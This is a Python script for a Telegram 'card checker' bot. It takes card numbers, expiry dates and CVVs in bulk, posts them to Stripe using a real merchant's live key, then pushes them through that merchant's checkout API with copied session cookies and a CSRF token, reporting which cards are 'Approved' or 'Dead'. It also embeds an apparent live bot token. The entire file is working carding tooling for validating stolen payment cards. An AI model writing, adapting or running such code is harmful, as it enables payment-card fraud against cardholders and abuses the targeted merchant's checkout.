import telebot
import requests
import re
import time
import threading

BOT_TOKEN = "7194711538:AAHiP8JKzuhuJx72REyy6sMsRdttaPdvWAY"
bot = telebot.TeleBot(BOT_TOKEN)

def parse_card_input(text):
    """
    Parse card input formats: CC|MM|YY|CVV or CC|MM|YYYY|CVV
    Accepts | or / as separator.
    """
    pattern = r'^(\d{12,19})[|/](\d{2})[|/](\d{2,4})[|/](\d{3,4})$'
    match = re.match(pattern, text.strip())
    if not match:
        return None
    cc, mm, yy, cvv = match.groups()
    if len(yy) == 4:
        yy = yy[2:]  # convert YYYY to YY
    return cc, mm, yy, cvv

def check_single_card(card_text, chat_id):
    card_data = parse_card_input(card_text)
    if not card_data:
        bot.send_message(chat_id, f"❌ Invalid format for card: `{card_text}`\nPlease use CC|MM|YY|CVV or CC|MM|YYYY|CVV", parse_mode='Markdown')
        return

    cc, mm, yy, cvv = card_data

    # Step 1: Create Stripe Payment Method
    stripe_url = "https://api.stripe.com/v1/payment_methods"
    stripe_payload = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'guid': 'df1cb213-3b8d-40b5-861d-b78e6fbb086a883b59',
        'muid': '6efd7584-fee8-409c-ba33-05d29099f4f5019d63',
        'sid': 'cfd57606-d22f-4f3f-b5f7-e2131ab32cf5b79697',
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/9e39ef88d1; stripe-js-v3/9e39ef88d1; card-element',
        'referrer': 'https://www.bloomingriders.com',
        'time_on_page': '129736',
        'key': 'pk_live_pikg8Knzv9oPKaFnRwcld8xQ'
    }

    try:
        stripe_resp = requests.post(stripe_url, data=stripe_payload, timeout=30)
        stripe_resp.raise_for_status()
        stripe_json = stripe_resp.json()
    except Exception as e:
        bot.send_message(chat_id, f"🔴 Error connecting to Stripe API for card `{card_text}`:\n{str(e)}")
        return

    if 'error' in stripe_json:
        error_msg = stripe_json['error'].get('message', 'Unknown Stripe error')
        bot.send_message(chat_id, f"❌ Stripe error for card `{card_text}`: {error_msg}")
        return

    pm_id = stripe_json.get('id')
    if not pm_id:
        bot.send_message(chat_id, f"❌ Failed to get payment method ID from Stripe for card `{card_text}`.")
        return

    # Step 2: Use pm_id in Bloomingriders API to create setup intent
    br_url = "https://www.bloomingriders.com/api/student/checkout/stripe/create-setup-intent"
    br_headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://www.bloomingriders.com',
        'referer': 'https://www.bloomingriders.com/checkout/?product_type=membership&product_id=1702',
        'x-country-code': 'IQ',
        'x-csrf-token': 'I3tRBBIz-XqI1FLslr2bsea5YXKkHRJKKN2g',
        'cookie': 'NEXT_LOCALE_V2=eyJtZXNzYWdlIjoiZGVmYXVsdCJ9; ruccd=s%3AeyJtZXNzYWdlIjoiSVEiLCJwdXJwb3NlIjoicnVjY2QifQ.l1Nc5QUSiaUxDqv9FSqzTLXC6u_LQNZbvLnFCfaShEA; swuid=s%3AeyJtZXNzYWdlIjoiY21hamxoOG80MDF2a2FrOW5kMnFwYjJ2ZCIsInB1cnBvc2UiOiJzd3VpZCJ9.ZZ8EZkLYw4jTun6GiWudxlUuL0xFSDMsbLijKZY0-Eo; __stripe_mid=6efd7584-fee8-409c-ba33-05d29099f4f5019d63; __stripe_sid=cfd57606-d22f-4f3f-b5f7-e2131ab32cf5b79697',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36'
    }
    br_json = {
        "stripe_payment_method_uuid": pm_id,
        "checkout_stat_id": 613838,
        "product_id": 1702,
        "product_type": "membership"
    }

    try:
        br_resp = requests.post(br_url, headers=br_headers, json=br_json, timeout=30)
        br_resp.raise_for_status()
        br_json_resp = br_resp.json()
    except Exception as e:
        bot.send_message(chat_id, f"🔴 Error connecting to Bloomingriders API for card `{card_text}`:\n{str(e)}")
        return

    # Check if "error" key exists in final response JSON
    if "error" in br_json_resp:
        result_msg = f"❌ Card Declined (Dead) for `{card_text}`\nError: {br_json_resp['error']}"
    else:
        result_msg = f"✅ Card Approved (Success) for `{card_text}`"

    bot.send_message(chat_id, result_msg)

def process_cards(cards, chat_id):
    """
    Process list of cards one by one, with 15 seconds delay between each.
    """
    for idx, card in enumerate(cards):
        card = card.strip()
        if not card:
            continue
        check_single_card(card, chat_id)
        # Don't delay after last card
        if idx != len(cards) - 1:
            time.sleep(15)

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message,
        "Send me one or multiple cards to check.\n"
        "Use format per card:\nCC|MM|YY|CVV or CC|MM|YYYY|CVV\n"
        "Separate multiple cards by new lines.\n\n"
        "Example:\n4111111111111111|12|25|123\n5555555555554444|11|2026|456")

@bot.message_handler(func=lambda m: True)
def handle_cards(message):
    # Split message by lines to get multiple cards
    cards = message.text.strip().split('\n')
    if len(cards) == 0:
        bot.reply_to(message, "❌ No cards found in your message.")
        return

    # Run card processing in a separate thread so bot doesn't block
    threading.Thread(target=process_cards, args=(cards, message.chat.id), daemon=True).start()

bot.polling()
